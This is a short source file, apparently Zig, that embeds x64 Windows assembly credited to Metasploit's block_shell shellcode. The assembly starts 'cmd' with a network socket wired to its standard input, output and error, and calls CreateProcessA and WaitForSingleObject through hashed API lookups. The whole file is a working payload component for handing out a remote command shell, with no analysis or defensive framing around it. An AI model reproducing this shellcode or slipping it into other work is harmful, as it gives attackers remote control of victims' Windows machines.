// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_shell.asm
pub const asm_code =
    \\shell:
    \\  mov r8, 'cmd'
    \\  push r8                     ; An extra push for alignment
    \\  push r8                     ; Push our command line: 'cmd', 0
    \\  mov rdx, rsp                ; Save a pointer to the command line
    \\  push rdi                    ; Our socket becomes the shells hStdError
    \\  push rdi                    ; Our socket becomes the shells hStdOutput
    \\  push rdi                    ; Our socket becomes the shells hStdInput
    \\  xor r8, r8                  ; Clear r8 for all the NULL's we need to push
    \\  push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
    \\  pop rcx                     ; Set RCX for the loop
    \\
    \\push_loop:
    \\  push r8                     ; Push a null qword
    \\  loop push_loop              ; Keep looping until we have pushed enough nulls
    \\  mov word [rsp+84], 0x0101   ; Set the STARTUPINFO structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    \\  lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO structure
    \\  mov byte [rax], 104         ; Set the size of the STARTUPINFO structure
    \\  mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION structure
    \\
    \\  ; Perform the call to CreateProcessA
    \\  push rsi                    ; Push the pointer to the PROCESS_INFORMATION structure
    \\  push rax                    ; Push the pointer to the STARTUPINFO structure
    \\  push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
    \\  push r8                     ; The lpEnvironment is NULL so the new process will have the same environment as its parent
    \\  push r8                     ; We don't specify any dwCreationFlags
    \\  inc r8                      ; Increment r8 to be one
    \\  push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
    \\  dec r8                      ; Decrement r8 (third param) back down to zero
    \\  mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
    \\                              ; r8 = lpProcessAttributes (NULL)
    \\                              ; rdx = the lpCommandLine to point to "cmd", 0
    \\  mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
    \\  mov r10d, 0x863FCC79        ; hash("kernel32.dll", "CreateProcessA")
    \\  call rbp                    ; CreateProcessA(0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi);
    \\
    \\  ; Perform the call to WaitForSingleObject
    \\  xor rdx, rdx
    \\  dec rdx
    \\  mov ecx, dword [rsi]
    \\  mov r10d, 0x601D8708        ; hash("kernel32.dll", "WaitForSingleObject")
    \\  call rbp                    ; WaitForSingleObject(pi.hProcess, INFINITE);
;
